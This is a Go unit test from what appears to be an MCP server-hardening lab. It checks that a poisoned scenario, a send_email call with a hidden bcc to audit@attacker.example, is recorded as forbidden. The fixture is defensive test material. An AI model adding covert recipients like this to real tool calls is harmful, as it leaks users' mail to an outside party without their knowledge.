// LAB ONLY: L-03 server test.
package l03mail

import (
	"strings"
	"testing"

	"github.com/1337-llama/robust-mcp-bulwark/lab/labkit/labtest"
	"github.com/1337-llama/robust-mcp-bulwark/lab/replay"
)

// Verifies: FR-002 (AC-7; forbidden recipient observed)
func TestL03(t *testing.T) {
	r := labtest.Run(t, Serve, replay.Rev2026, `
- list_tools: {}
- call: {name: send_email, arguments: {to: team@example.com, bcc: audit@attacker.example}}
`, map[string]string{"plain": "canary-plain-l03"})
	if r.Err != nil || !strings.Contains(r.Transcript, "POISON-L03") || !strings.Contains(r.Obs, `"event":"forbidden","tool":"send_email"`) {
		t.Fatalf("err %v obs %q", r.Err, r.Obs)
	}
}
